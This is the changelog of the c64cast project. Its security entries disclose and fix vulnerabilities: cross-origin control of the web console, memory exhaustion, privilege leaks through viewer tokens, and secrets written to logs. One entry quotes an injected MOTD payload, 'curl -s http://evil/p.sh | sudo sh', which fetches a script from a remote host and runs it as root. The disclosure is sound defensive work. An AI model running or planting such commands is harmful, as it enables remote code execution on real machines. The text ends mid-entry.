# Changelog

All notable changes to c64cast are documented here. The format follows
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and c64cast follows
[Semantic Versioning](https://semver.org/spec/v2.0.0.html) over its *user*
surface — the CLI flags, the config schema, the `example:` names, and the data
directory layout. The Python API carries no stability promise while the version
is `0.x`.

Work lands under `## [Unreleased]`; cutting a release renames that section to
the version and stamps it with the date.

A version that needs the reader to *do* something — reinstall to pick up a new
extra, re-measure a calibration, rename a setting — opens with an
**Upgrade notes** subsection, above the Keep a Changelog ones. A version's
section is lifted verbatim into its GitHub release body, so that block is the
first thing anyone upgrading reads, and an instruction anywhere further down is
in practice not read at all. Releases that ask nothing of anyone leave it out.

## [Unreleased]

### Fixed

- **A second config save destroyed the only copy of your hand-written show
  file.** Saving back live-tune changes copied the config to one fixed
  `<name>.bak` on *every* save, so the second save's backup was the first
  save's output — and `--overwrite` saves on every normal exit and Ctrl+C when
  anything was tuned, so two runs of a tuned show was all it took. The log line
  said "(backup .bak)" throughout, which read as reassurance. The `.bak` is now
  written once, only when it does not already exist, so it stays the file you
  authored however many times the show saves over itself; the log says which of
  the two happened. There is no undo for the previous save any more — the file
  worth keeping is the one nothing generated.

### Security

- **`[wled].listen` bound a tokenless control surface to the network by
  default, and only warned about it.** Mode 1 covers everything the control
  plane's four verbs do and more — `on=false` pauses, `seg[].fx` jumps scenes,
  `sx`/`ix` sweep live params, `pal`/`col` force the palette, a preset save
  writes the data dir — while carrying no token at all and being advertised over
  mDNS, so any host on the segment could drive the show. Yet `[control]`, whose
  whole surface is pause/resume/skip/reload, *refuses* to bind off loopback
  without a credential, and this only logged a warning. It now refuses the same
  way, with `[wled].allow_unauthenticated = true` as the opt-in for a network
  you trust — a config flag rather than a token because the WLED protocol has
  none to offer and LAN discovery is the entire feature. **This is a breaking
  change for an existing `listen` config:** Mode 1's default endpoint is
  `0.0.0.0:8080`, so a plain `listen = "enabled"` now needs either the opt-in or
  a loopback bind (`listen = "127.0.0.1:8080"`).
- **The performance console took cross-origin commands.** A WebSocket handshake
  is exempt from CORS entirely, and Starlette's `Request.json()` never looks at
  `Content-Type` — so with `[control] enabled = true` and the unprompted default
  `token = ""`, any page the performer happened to visit could open
  `ws://127.0.0.1:8765/perf/ws`, read every pushed state frame, and send command
  frames that drove the running show; `POST /perf/command` was reachable the
  same way as a `text/plain` form submit, which is a CORS-simple request with no
  preflight to refuse. The open loopback mode is justified as "exposed to
  whoever already has a shell here", and a browser tab is not that person. Both
  `/perf/ws` and `/perf/command` — and `/api/ws`, which shares the loop — now
  refuse a request whose `Origin` is present and names a different host:port
  than its own `Host` (the handshake is closed before `accept`), and the POST
  requires an `application/json` content type. A request with **no** `Origin` is
  still served: that is `curl`, `wscat` or a script, which is exactly the caller
  the open mode describes.
- **`POST /perf/command` buffered an unbounded request body.** `await
  request.json()` accumulates every chunk before parsing, and this was the one
  POST in the package that did not route through the shared cap that exists for
  precisely this — a remote memory exhaustion on a 1-2 GB appliance, taking down
  a process that owns live hardware, from a caller who needs no credential in
  the open mode. Capped at 64 KiB (a console command is a few hundred bytes),
  with a 413 for an oversized body and a 400 for one that is not a JSON object.
- **Nothing capped the console state sockets.** A handshake is a bare `GET`, so
  the role gate admits even a read-only `viewer` token — the credential meant to
  be handed to a guest — and every accepted socket ran its own push loop over a
  frame that resolves the whole live-tune catalog and reads two slot stores off
  disk. A couple of hundred connections bought a few hundred frame builds a
  second on the host that owns the hardware, stalling the operator's own console
  and every other route on the same app. `/perf/ws` and `/api/ws` now share a
  cap of 8 open sockets and close a handshake past it before accepting, the same
  refuse-rather-than-queue decision the screen stream already made.
- **A read-only link disclosed the operator's filesystem layout.** The state
  frame carried `tuned.config_path`, the absolute path of the running show file,
  and both `GET /perf/state` and the socket pushes are read methods — so a
  viewer token learned the operator's username and directory layout, which is
  reconnaissance for the config-store routes the same host exposes. A viewer now
  gets an empty `config_path`; `config_name` (already on the wire) is all the
  page used it for.
- **A `loop_slot` command could grow a preset file without limit.** The console's
  transport verb passed its `slot` straight through with no range check, and
  `LoopPresetStore.save` had deliberately overridden away the shared
  `1..250` guard — so an incrementing slot persisted one unbounded new key per
  event, each save re-reading and rewriting the whole grown file on the playlist
  thread that drives the hardware, with the state feed re-parsing it on every
  push. The slot is bounded at both ends now, and the digits no longer reach the
  OSD line the transport engine draws over the audience output.
- The `/perf` page is served with `Content-Security-Policy`
  (`frame-ancestors 'none'`), `X-Frame-Options: DENY` and
  `X-Content-Type-Options: nosniff`. Hardening rather than a fix: it is a fixed,
  server-authored body with no caller content in it, and the clickjacking the
  headers refuse is strictly harder than what the `Origin` check above closes.

- **A credential inside a scene `file =` URL was echoed verbatim.** A private
  asset is legitimately reached with
  `file = "https://user:token@cdn.example/clip.mp4"`, and nothing redacted it:
  a resolve failure quoted the spec into `--log-file` and into the report the
  web console renders in a browser, and `recording_metadata` copied it into the
  per-scene snapshot — which `scripts/scene_config_to_description.py` renders as
  `Source video: <url>` in a **published** video description. The connection
  target has refused a `user:pass@` netloc for exactly this reason since it was
  introduced; a secret inside a scene `file` *value* was covered by none of that
  machinery, because it is not a field of its own. Every message that quotes a
  media spec now strips URL userinfo and masks `token=`/`key=`/`password=`-style
  query parameters, and so does the snapshot.
- **A media URL was fetched at build time with no timeout.** The yt-dlp
  resolution runs inside `build_scene`, i.e. after the link is open and the
  machine has been reset, and it passed no `socket_timeout` (nothing in the tree
  calls `socket.setdefaulttimeout` either). A host that completed the TCP
  handshake and then never answered held the C64 in reset with the DMA socket
  open until the process was killed — and under `--serve` the supervisor stayed
  `STARTING`, so `POST /api/session/stop` returned 202 and changed nothing. The
  attacker is whoever controls the host behind a pasted link, which is a normal
  VJ workflow. It is bounded now, one `log.info` line names the URL before the
  fetch (yt-dlp's own logger goes to `log.debug`, so there was nothing at
  default level saying what it was waiting on), a resolved stream URL whose
  scheme is not http/https is refused rather than handed to ffmpeg — which
  honors `file://` and `udp://` — and the resolved title is stripped of control
  characters and length-capped before it becomes the scene name, since it comes
  from the page and lands in log lines interpolated with no arguments.
- **`validate_scene_cfg` is reachable from the network, and did unbounded
  filesystem work there.** The load-time SID header check read its whole
  candidate file with no guard, so a config naming a FIFO `x.sid` blocked the
  validate request thread forever and a multi-gigabyte one exhausted memory; it
  now requires a regular file and caps the read. A `**` glob whose first path
  segment is itself a pattern under `/` — a walk of every mounted volume inside
  one HTTP request — is refused outright. A general depth or time bound on glob
  expansion is still open; the ceiling trades against legitimately deep HVSC and
  media trees.
- **A `wled` scene's `sink_allow` accepted an IPv6 entry the sink can never
  match.** The pixel sink binds `AF_INET` only, so the peer address it compares
  against is always a dotted quad — an IPv6 allowlist entry produced a config
  that validated cleanly and then silently dropped every sender, with no log
  line. It is refused at validate time now, naming the IPv4 requirement.
- **`[wled].listen` says what it exposes.** Turning on the virtual WLED device
  binds its JSON/WebSocket API on every interface with no token and advertises
  it over mDNS, and a reachable client can pause the run, jump scenes, sweep
  live params, force the palette and write presets — the same capability
  `validate_control_cfg` refuses to leave unauthenticated off loopback. LAN
  discovery is the point of the feature, so this warns rather than refuses, but
  it no longer happens silently.

- **A `viewer_token` was a full-control credential.** `GET
  /api/configs/{ref}` had no role check at all, and the auth gate's only
  viewer restriction is the HTTP method — so every `GET` passed for a
  read-only token, and that route returns the config file's *raw text*,
  including any `[web]`/`[control]` `token` and `[ultimate64].dma_password`
  it carries. Since `[web].config_roots` defaults to the directory the host
  was launched from, and `./c64cast.toml` is the documented home of
  `dma_password`, the file a guest could read was exactly the one holding
  the secrets: `GET /api/configs` for a name, `GET /api/configs/<ref>` for
  the admin token, and a link handed out to be read-only became remote
  control of the machine. Authorization now has a per-route seam
  (`auth.require_full`, with `SCOPE_ROLE_KEY`/`ROLE_FULL`/`ROLE_VIEWER` and
  `is_viewer` replacing six bare string literals across three modules — a
  misspelling in any of them evaluated False and *granted* write access),
  that route refuses a viewer with a `403`, and a contract test walks the
  assembled app and fails on any viewer-reachable route that nobody has
  classified, which is the part that stops the next one. Browsing config
  *names*, the media listing, the screen and the state feed stay
  viewer-readable — that is what a read-only link is for.
- **The appliance setup form erased every secret in `settings.toml`.**
  `POST /api/setup` — unauthenticated while the setup window is open —
  seeded a `Config` from the machine-settings file (secrets included),
  overlaid the connection target, and rewrote the same file through
  `config_serialize.dumps`, which suppresses every secret field. So the
  first successful setup silently dropped `[ultimate64].dma_password`
  (leaving an appliance unable to talk to its own password-protected U64)
  and `[web].token`/`token_file`/`viewer_token` — including a `[web].token`
  pin, which is the one thing `token_settable` exists to protect: the form
  correctly refused to *replace* a pinned token and then deleted it anyway,
  so the next restart minted a brand-new credential and the URL the admin
  had been handed was dead. Both writers of that file now go through one
  `config_serialize.save_machine_settings`, which preserves what the merge
  read; `--save-settings` stops warning that it is about to drop a
  hand-written `dma_password` because it no longer does, prints the
  secret-free rendering of what it saved (naming the preserved keys, never
  quoting them), and the file is restricted to `0600` when it carries one.
  `setup_api._write_connection`'s docstring used to *assert* it mirrored
  the CLI's save path "exactly" while missing the guard that path had.
- A setup token was written unstripped and read back stripped, so a token
  pasted with a trailing space went out in the form's login link with the
  space and came back after the restart without it — the one link an
  appliance admin is given answering `401` forever, with no other way to
  learn the real token. Worse, 16 spaces passed the minimum-length check,
  stripped to `""` on read, and made the host mint a credential nobody had
  ever seen with the setup window already closed: recovery needed shell
  access or a reflash. Tokens are now stripped before every check, an
  interior newline is refused, and `MIN_TOKEN_LENGTH` moved to
  `control/auth.py` — enforced on the setup route as before, and now also
  warned about for a short `[web]`/`[control]` token from any source, since
  nothing here throttles login attempts.
- One malformed cookie anywhere on the `Cookie` header discarded the whole
  jar, `c64cast_token` included — CPython's `SimpleCookie` bails on the
  first segment its pattern rejects and drops the morsels it already
  collected, *without raising*, so the `except Exception` that looked like
  the guard for this could never fire. Because browser cookies are scoped
  by host and ignore the port, any other service on the same box setting a
  cookie with an illegal character made the console permanently unreachable
  in that browser: a `401`, the login form, a fresh `Set-Cookie` that
  replaced ours and not the offender, and a `401` again — a login loop with
  nothing logged. The one morsel that matters is now parsed out of the
  header directly.
- `POST /api/login` and `POST /api/setup` are both reachable with no
  credential and both called `await request.json()`, which buffers a body of
  any size — a remote memory exhaustion on a 1–2 GB appliance, taking down a
  process that owns live hardware. Both now read through a shared capped
  reader (`Content-Length` refused up front, then the stream abandoned past
  the cap, which is the only check a chunked body cannot lie about) and
  answer `413`. `web_api`'s own body reader shares it, so `ConfigStore`'s
  `ConfigTooLarge` — which protects the *file* — stops being the only limit.
- `GET /api/screen/stream` is a `GET`, so a read-only token reached it, and
  nothing capped concurrent watchers. Each open stream holds one thread of
  the *default* executor essentially continuously (the fps sleep happens
  inside the frame generator), and that executor is also where media-upload
  chunk writes and every synchronous route run — so a dozen parallel
  requests from one viewer credential starved the whole console, with a
  healthy process and an empty log. The streams now have a dedicated
  bounded pool and a watcher cap, refusing past it with `503`.
- `auth._safe_next` rejected `//host` but not `/\host`, which a browser also
  resolves offsite; what kept the login redirect on-site was Starlette's
  percent-encoding rather than the validator's own check.
- **A quoted `"false"` in a TOML config turned a security gate on.**
  `[control] allow_unauthenticated = "false"` and `[web] setup_wizard =
  "false"` stored the *string* `"false"`, and every consumer of a bool field
  is a plain truthiness test — so both read as **on**, which for
  `allow_unauthenticated` short-circuits the refusal that stops an
  unauthenticated control plane binding to the LAN, and for `setup_wizard`
  serves the one-time *unauthenticated* setup form (whoever reaches it first
  picks the connection target and the console token) instead of the
  token-gated app. A field annotated exactly `bool` now refuses a non-bool
  value, naming the section and key; the tri-states (`bool | str`, e.g.
  `[video].use_reu_staged`) are untouched.
- **A parse error in a config file copied the offending line's secret into
  the log.** `_format_toml_error` quotes the source line the TOML parser
  choked on, cli.py logs the resulting `ConfigError` at error level, and
  `--log-file` mirrors it to disk — so a syntax error anywhere on a
  `dma_password = "…"` or `token = "…"` line wrote the credential to a file
  that outlives the run, in the one situation where the log gets pasted into
  an issue. Such a line is now redacted (the position and the parser's
  message carry the diagnostic value; the value does not).
- **Refusing a credential-bearing connection target logged the
  credential.** `connect._reject_userinfo` refuses a `user:pass@host` target
  precisely so a secret cannot reach `[ultimate64].url`, from which
  `--save-settings` writes it to `settings.toml` and echoes it to stdout —
  and then interpolated the whole target, credential included, into the
  error. Every parse failure now reports the target through
  `connect.redact_target`, which masks userinfo and secret-shaped query
  values while keeping the host, and `[ultimate64].url`'s own messages and
  its debug line use the same spelling.
- **A bare host in `[ultimate64].url` skipped URI validation entirely.** A
  value with no `://` was prefixed with `http://` and returned without ever
  reaching `connect.parse_connection_uri`, so `url =
  "admin:hunter2@192.168.2.64"` was accepted verbatim and handed to
  `requests` as Basic auth — the same `user:pass@` refusal that the
  scheme-carrying spelling gets, reached from a different door. The value is
  normalized first and validated always, which also closes the sibling
  bypass: `url = "192.168.2.64?dma_port=9999"` was passing a query param
  straight into the base URL that this field's own help says cannot carry
  one.
- **The appliance setup window reopened on any lost `setup.json`, not just
  `--reset-setup`.** Whether to serve the unauthenticated setup form was
  decided by the absence of one file under the *data* root, and that cannot
  tell "this is a first boot" from "this host lost its data dir": a data
  root that is a container layer with no volume, a tmpfs, or a swept cache
  reopened `POST /api/setup`, `/setup` and the whole console shell to
  everything on the segment — while the host stayed fully configured,
  because machine settings live under the *config* dir — and `console_mdns`
  announced it with `setup=1`. Whoever won that race could repoint the box's
  connection at a host they control and, on a host relying on its generated
  token, write a replacement admin credential and evict the operator's
  bookmarked link. The window now also requires that machine settings *not*
  already name a connection target; a provisioned host with no marker logs a
  warning and stays shut, and `c64cast --reset-setup` writes an explicit
  reopen marker (`<data root>/setup-reopen`) so an admin who already has
  shell access can still ask for the window while a lost data dir cannot ask
  for it by itself. Opening it is a `log.warning` either way.
- `last_error` reached read-only viewers unredacted. The supervisor stored
  raw exception text and `SessionStatus.as_dict()` shipped it verbatim into
  the `session` key of every `/api/ws` frame and of `GET /api/session`, both
  of which a `viewer` credential may read — so a build failure whose message
  quoted a connection URL with its `?query` link knobs, or a value a library
  echoed back, was handed to a guest whose credential exists specifically to
  withhold control. The sibling `log` key on that same frame was already
  passed through `redact_secrets` on the way in, with a comment saying
  exactly why; this was the one field on the frame that bypassed it.
- `[web].viewer_token` set to the same value as `[web].token` is now refused
  when the credentials are resolved, rather than at app construction:
  `auth.match_role` compares the full token first, so one secret pasted into
  both fields — or both fed from a single secret-manager entry — silently
  granted every holder of the "read-only" link start, stop, config writes
  and media upload. The refusal names the reason and exits `2` instead of
  raising a `ValueError` out of the middle of a FastAPI app build.
- **The appliance's login MOTD rendered two unsanitized strings from a file
  a lower-privileged account owns.**
  `packaging/systemd/c64cast-update-check.service` writes
  `update_check.json` as the unprivileged `c64cast` account, while
  `packaging/motd/98-c64cast-update` prints `c64cast --motd-line` from
  `/etc/update-motd.d/`, which pam_motd runs as **root** at every login —
  and the unit's own comment requires both surfaces to resolve the same
  file, so the working configuration is precisely the one where a
  low-privilege account owns a file root reads. `read_update_state` coerced
  `running_version` and `latest_version` with a bare `str()`, imposing no
  charset or length constraint, and both were interpolated straight into
  that line: a `"latest_version"` of `"0.5.0\nSECURITY: apply the hotfix
  now: curl -s http://evil/p.sh | sudo sh\n"` rendered as an additional,
  official-looking MOTD line at every root login, and ESC/OSC payloads went
  further — erasing or rewriting the surrounding banner, and on terminals
  honoring OSC 52 writing the admin's clipboard. Both fields must now match
  a plausible version token, which is also the gate `upgrade.latest_release`
  applies to PyPI's own answer, so nothing shaped unlike a version is ever
  written or read back. (The web console was never affected — it binds these
  values as text nodes, so the terminal is the one sink that acts on control
  bytes.)
- Every field of `update_check.json` is now type-checked on read instead of
  coerced, because `float()`, `bool()` and `str()` cannot fail and so turned
  a mistyped field into a confident wrong answer rather than the routine
  "nothing recorded yet". `"newer": "false"` read back as `True` —
  `bool("false")` is truthy — and `rechecked()` could not correct it, since
  a record whose `running_version` already matches is returned untouched, so
  the login banner offered the release the box already ran. A `checked_at`
  of `NaN` or `Infinity` (both of which `json.loads` accepts as bare
  literals) made *every* comparison in `is_stale` read as "not stale", which
  disabled the one safeguard against quoting a dead answer — permanently and
  with no other symptom, so an internet-facing appliance that had missed a
  year of releases said nothing about it at either surface. `is_stale` now
  also treats a date more than a day in the future as stale rather than
  fresh: "can't tell how old this is" is not "recent".

### Fixed

- **One malformed command frame closed the performance console's only feed.**
  `PerfBridge.apply` indexed `cmd["slot"]` / `["layer"]` / `["target"]` /
  `["index"]` directly and coerced with bare `int()` / `float()`, so a frame
  that decoded fine and then named an action without its fields — the shape a
  cached phone page from an older build sends — raised `KeyError` inside the
  WebSocket push loop, wrote a full traceback at default verbosity, and tore
  down the socket that carries state and log lines. That is exactly the outcome
  the frame decoder was written to prevent for an *undecodable* frame: the
  validation was enforced at the decode and defeated one layer down at the
  dispatch. Every field is now validated rather than coerced (including the
  bare `Infinity` / `NaN` literals `json.loads` accepts, whose `int()` raises
  `OverflowError`), a bad frame answers `{"ok": false}` instead of a 500 on
  `POST /perf/command`, and the socket loop guards the dispatch as well, so no
  raise from any engine a tap reaches can end the feed.
- **The console's state feed did blocking disk and DMA work on the event loop.**
  Both `async def` socket routes called the frame builder and the command
  dispatcher directly: one frame reads the look store and the loop-preset store
  off disk (~3 times a second per connected console), and a border or background
  pick is a DMA write over TCP port 64 that is unboundedly long on a stalled
  link. That loop also serves `/status`, every `/api` route and the MJPEG screen
  stream, so a slow data directory or a stalled machine stalled all of them —
  while the sibling sync route got the threadpool for free and was never
  affected. Both now run off the loop.
- **One state frame could describe two different scenes.** The console snapshot
  re-read `playlist.current` four separate times, and a scene advance writes the
  index and the current scene as two separate statements with a teardown between
  them — so an interleaved advance emitted a frame naming scene A over scene B's
  effect rack and tune panel, with the layer indices the console then offered
  addressing a chain that had moved. The scene and index are sampled once.
- **A dragged slider froze the effect rack and the tune panel for the rest of
  the session.** Both panels skip a rebuild while something inside them has
  focus (so a rebuild can't drag the handle out from under a finger), and a
  range keeps focus after a drag and a `<select>` after a change — so the first
  gesture stopped that panel updating until the performer happened to focus
  something else: a bypass flipped from a MIDI pad no longer showed, and after a
  scene advance the panel kept offering the previous scene's knobs. Both blur
  when the gesture ends, as the WLED page already did.
- **The console's picture kept streaming the previous machine on an ensemble
  run.** The screen `<img>` bakes the selected system into its URL and was only
  ever re-pointed by the WATCH button, so tapping another system tab moved every
  control to the new machine and left the old machine's video playing
  underneath, with nothing on the page saying so.
- **The console showed a BPM between shows.** With no session running, the page
  stopped the beat pulse but left the tempo number alone, so the sticky header
  read the last show's BPM — or a confident `120` from the page's own
  initializer, before any frame had arrived — above "No session running." It
  reads `--`.
- The console page's WebSocket reconnect backs off exponentially (0.5 s to 15 s)
  instead of retrying at a fixed interval forever, and now retries at all after
  a construction failure, where it used to fall back to polling and never try
  the socket again for the life of the page. The WLED device page's copy of the
  same loop gets the same fix — the two had already drifted to different delays
  with no backoff on either.
- Adding a verb to the console's transport verb list without adding a dispatch
  branch would have silently saved or cleared one of the performer's persisted
  loop presets: the branch chain ended in an unconditional `loop_slot` enqueue
  with no `if`. The last branch is explicit and an unhandled verb is refused,
  with a test that walks the list and asserts each verb has its own effect.
- The console's addressed-but-no-op writes (a bypass on a layer the scene does
  not have, a knob the current scene cannot resolve, a jump past the end) log one
  debug line each. The page discards every response body, so a pad that did
  nothing mid-set left no evidence on either side of the wire — "the tap reached
  the host and did nothing" and "the tap never arrived" were indistinguishable.
- The `tuned` block of a state frame took two independent snapshots of the
  live-tune record, so a knob turned between them made the change list and the
  pasteable TOML snippet in one frame describe different sets of changes.
- Two test-isolation defects found while fixing the above, both reaching the
  developer's real `~/.local/share/c64cast/`: one supervisor test wrote and then
  **deleted** the real run marker (the file that tells a `--serve` host its last
  session did not shut down cleanly), and the live-tune tests read the real
  character ROM and cached it process-wide for every other test in the worker.

- **The REU mic pump ran ~33% slow at the default sample rate.** The C64-side
  pump is paced by CIA #1, whose latch has to be the chunk size times the NMI
  period — a ratio of periods, so it is the same on NTSC and PAL, but it tracks
  `[audio].sample_rate`. The video bring-up derived it from the live NMI latch;
  the mic bring-up wrote a constant whose own definition records it as the
  value for 8 kHz. At the shipped 12 kHz default that asked the pump for 85/128
  of the bytes the NMI drains, so the audio ring under-filled and the NMI
  re-read a lap-old span — the audible stale-data echo the derivation exists to
  prevent. Both paths now share one derivation, one register write and one
  record of what was written, and a latch too large for the two 8-bit registers
  (roughly `sample_rate` below 2 kHz — `nmi_rate_safety` bounds only the fast
  end) is clamped with a warning instead of being silently truncated modulo
  65536 into an arbitrary pump rate.
- **A REU-staged audio track longer than ~20 minutes overwrote the video
  staging region.** One byte is one sample, so the upload's footprint grows
  with the track's duration, and nothing at any layer bounded it: past
  `$E00000` at the 12032 Hz NTSC default it runs into the region the REU
  bank-swap bitmap path rewrites every frame, so the audio pump DMA'd bitmap
  bytes into the ring as full-scale garbage while the per-frame video writes
  shredded the audio — with no host-side error, on nothing more exotic than a
  long clip. The payload (and with it the EOF pad, which starts where the
  payload ends) is now bounded by the region and truncated with a warning.
- **A short chunk during the audio prebuffer could push a ring write past the
  end of the ring.** The worker's NEUTRAL tail pad was gated on the consuming
  phase, so a collect window that closed short while prebuffering was written
  at its raw length and took the ring write pointer off the chunk grid the ring
  size is an exact multiple of. Both wrap guards check the address only after
  the increment, so the next chunk to cross the boundary went out first and its
  tail landed outside the ring — never played, and over memory another scene
  uses. Reachable on the ordinary mic path, where the worker starts before the
  input stream opens. Every short chunk is padded now; the partial-underrun
  counter stays consumption-phase-only.
- **A seek or loop wrap could leave an ~85 ms stale-audio echo in the ring.**
  The audio worker holds one chunk in flight, and a transport splice that
  landed while it did dropped that chunk without writing anything into the ring
  span it had already been assigned — so the NMI replayed that span from one
  ring lap earlier, in the one place the splice design promises a
  constant-latency crosscut. The span is NEUTRAL-filled now, which also keeps
  the pacing servo's idea of the write head truthful across the splice. The
  pause path happened to cover this; a plain seek or loop wrap did not.
- **A dead audio worker was invisible, and could come back as a second one.**
  `stop()` joins the worker with a one-second bound, because a ring write on a
  stalled link can outlast it — but it neither said so nor stopped the next
  scene from starting a second worker into the same ring. A survivor is now
  reported, and each worker is fenced to the start that created it, so it exits
  on its own instead of being resurrected by the next scene's start. Worker
  liveness also joins `AudioStreamer.stats()`, which is what the crash
  handler's flag was always for.
- **A capture block that arrived as a flat array crashed the mic callback.**
  All three capture paths spelled their mono fallback in a way that could only
  raise `IndexError` on the one input it existed for — inside a PortAudio
  callback, where the traceback goes to stderr rather than the log and audio
  simply stops. One shared downmix now, correct on both shapes. In the same
  callback, a link failure during a REU mic write is caught, counted and logged
  once per run instead of killing mic audio for the rest of the scene with
  nothing in the log to point at.
- **The audio push path's backpressure used the wall clock.** A clock step
  during a run either expired the producer's 200 ms wait instantly, dropping a
  blob that had capacity coming, or parked the decoder thread for the length of
  a backward step; every other deadline in the module is monotonic. A blob
  larger than the whole queue cap could also never satisfy the gate however
  empty the queue got, so it was dropped forever with no diagnostic — an empty
  queue admits it once now.
- **Auto-interleaved videos got almost none of a video scene's wiring.**
  `[playlist].interleave_videos` constructed its `VideoScene` directly and
  hand-copied one of the six things the video builder does — the frame-push
  cap. Everything else was silently absent, kept from crashing by the scene
  defaults: no `tempo_scale`, so the bitmap+`$D418`-DAC tempo compensation was
  switched off for exactly the hires_edges-over-DAC case it exists to correct
  and every interleaved clip played the documented ~11-12% slow while
  configured video scenes did not; no sampler resolution, so a sampler-capable
  Ultimate 64 played interleaved clips on the lo-fi 4-bit DAC (and took its
  20 fps cap) while every configured video scene in the same run got the
  off-bus sampler at full rate; and no `[color]` section, no
  `[midi_control].loop_audio`, no effect chain, no overlays, and none of the
  epilogue stamps — so `[midi_control].osd = "off"`, `[dsp].pre_emphasis` and
  `[debug].frame_numbers` were ignored on these scenes alone. They are built
  through `build_scene` on a synthetic video scene now, so there is nothing
  left to keep in sync by hand.
- **A `display = "random"` slideshow lost its dither and cell strategy on the
  first slide.** The runtime re-pick rebuilt its display mode from a second,
  hand-written copy of the factory's wiring, and that copy had drifted: it
  passed neither `dither_method` nor `cell_strategy`, so the documented
  static-scene resolution (`[color].dither = "auto"` → floyd-steinberg,
  `cell_strategy = "auto"` → error-min) was replaced by "no dithering" and
  frequency allocation from the very first image onward. The same copy handed
  two facts to the flicker resolver and withheld them from the double-buffer
  resolver in the same breath, so a slideshow running the REU mic pump could
  end up installing the `$0314` raster IRQ the pump already owns. There is one
  wiring object and one entry point now, shared by the factory and the scene.
- **A `display = "random"` slideshow's overlays were validated against one
  random pick.** `mcm` is in the pool and rejects a text overlay, so the same
  unchanged config loaded on roughly four runs in five and `--doctor` returned
  a different verdict from one invocation to the next — and when it did load,
  the runtime re-pick could still land on the rejected mode with no check at
  all. Every mode the pool can produce is checked now.
- **A URL carrying a comma was cut into pieces.** The `file =` spec was split
  on every comma before anything looked at the scheme, so the standard Akamai
  HLS shape (`.../clip_,500,800,.mp4.csmil/master.m3u8`) became a truncated URL
  plus fragments reported as paths with the wrong extension — naming things the
  user never typed. yt-dlp's own resolved stream URLs, which a URL video scene
  writes back into its file spec, routinely carry commas in query parameters.
  After a URL entry a comma now separates only when the next fragment announces
  a new entry (it begins with whitespace, or is itself a URL), so
  `http://h/a.mp4, b.mp4` is still two entries and `http://h/a.mp4,b.mp4` is
  one URL.
- **A page URL mixed into a multi-entry `file =` spec was never resolved.**
  Only a whole-spec URL goes through yt-dlp, so such an entry stayed in the
  candidate pool as a raw page URL for PyAV to open as a media file — the exact
  cryptic `Invalid data found` failure the offline pre-check exists to prevent,
  and it happened even with the `yt` extra installed. It is refused at validate
  time with a message saying to give the URL a scene of its own.
- **A populated directory whose name contains `[`, `*` or `?` was reported as a
  glob that matched nothing.** An existing *file* already won over glob
  interpretation — `Clip [videoid].mp4` is yt-dlp's own naming convention — but
  a directory did not, and the same convention produces such directories for
  playlist downloads. `os.path.isdir` is now tested before the glob branch, like
  `os.path.isfile` already was.
- **A `generative` scene with `audio_source = "sid"` and no `file =` failed on
  a normal HVSC tree.** The recursive walk of the default SID directory was
  keyed to the *error-message label* `"waveform"`, and this arm passes a
  different label while sharing the same default directory — so it got a shallow
  listing, and every documented HVSC layout has zero `.sid` files at the top
  level. It was refused with "the default directory 'assets/sids' is missing or
  empty" on the exact tree a waveform scene plays out of the box. The recursion
  is an explicit keyword now, which also means rewording an error message can no
  longer switch HVSC discovery off.
- **A live scene beside a `follower_only` sibling tore down every 30 seconds.**
  The single-scene duration default counted `[[scenes]]` entries, but
  follower-only scenes never reach the playlist and the playlist's own
  single-scene mode counts what it was handed. So the canonical ensemble shape —
  one webcam or blank scene plus a follower-only sibling — really was a
  single-scene playlist, yet the scene kept the finite 30 s default and
  re-opened the capture device every 30 seconds forever (and under `--no-loop`
  the show simply ended). It counts the rotation now.
- **`--doctor` reported a display mode a slideshow never uses, and skipped it
  from three color reports.** `resolve_scene_display` answered `hires_edges` for
  a default-display slideshow while the build resolved `mhires`, and doctor
  branches on that answer — dropping the `color_match` report for `hires_edges`
  and the `cell_strategy`/`motion_smoothing` reports for anything but `mhires`.
  The one scene type whose `auto` resolutions actually differ was therefore the
  one type missing from all three. It delegates to the slideshow resolver now.
- **A bad `[color].flicker_tolerance` was the one color typo that escaped the
  config check.** It had no whole-config validator, so it raised a plain
  `ValueError` from deep inside the display build — a different exit code from
  every sibling `[color]` field, naming only `[color]` and never the scene an
  override came from — and that raise is only reachable from a scene that paints
  a frame, so a bad value in a SID-only or blank-only playlist was never caught
  at all, `--doctor --skip-probe` included.
- **A `webcam` scene accepted `display = "blank"` and painted nothing.** Every
  other frame-bearing scene type refuses it with guidance, because blank mode
  ignores the frame it is handed; webcam was the one type with no validator, so
  the run opened the camera, grabbed frames and showed an empty screen with no
  error anywhere. `display = "random"` on a webcam now gets the same "only
  slideshow does" message its siblings give instead of a raw "unknown display
  mode".
- **A SID/display conflict could advise a change that did not clear it.** The
  overlap check reports the first conflicting region and looks at screen RAM
  before the bitmap, so a payload spanning both was reported as the screen
  conflict — and "load above $07E8" then lands straight in the hires bitmap.
  The remedy is worded off the highest region the display actually reserves.
- **A `[playlist].videos_dir` entry that was a directory named `clips.mp4`
  became an interleaved video.** The interleave lister filtered on the extension
  alone with no regular-file check, unlike the identical listing a scene's
  `file =` gets, so the entry only failed once PyAV tried to open it. Both go
  through one lister now.
- **HVSC unpacked after the first miss stayed invisible.** The songlengths
  lookups are process-global memos with no invalidation, including the "not
  found" answer — so in a long-lived `--serve` host, unpacking HVSC or fixing
  `[playlist].songlengths_file` could not take effect without restarting the
  process. The config-reload path clears them now. The "auto-detected HVSC
  database at …" line also moved behind the cache check, so it is logged once
  per process rather than once per waveform scene built.
- A scene that falls back to its default media directory now logs the absolute
  directory it resolved to. The defaults are relative, so they resolve against
  the process's working directory — which for a daemon, a systemd unit or a
  container entrypoint is not necessarily where the operator thinks the media
  is.

- **A preview run whose window had closed could not be stopped.** When
  `[preview]` is on, the main thread drives the window and joins the playlist
  threads itself when it stops — and that join had no timeout. Three ordinary
  paths reach it: the operator closes the window (documented as *not* a stop
  signal), a draw failure disables it, and, on the very first iteration, a
  headless opencv build or a machine with no display, where the window logs
  "preview disabled" and the show carries on. An untimed `join()` parks the
  main thread where no signal handler can run, and on the CLI the SIGINT and
  SIGTERM handlers are the *only* thing that sets the stop flag — so from that
  moment neither Ctrl+C nor a service manager's SIGTERM could end the run,
  teardown never happened, and the machine was left mid-session. It now uses
  the same polling join as the headless path, which is what the three other
  join sites were already changed to for exactly this reason. `[preview]` over
  SSH, and `[preview].enabled = true` on a headless install, are the runs that
  were affected.
- **Webcam clips could never launch from the `[[performance.clips]]` grid.**
  `type` defaults to `"webcam"` in a clip table, but the decision to open the
  camera only looked at `[[scenes]]` and `[vision]`. With no webcam scene
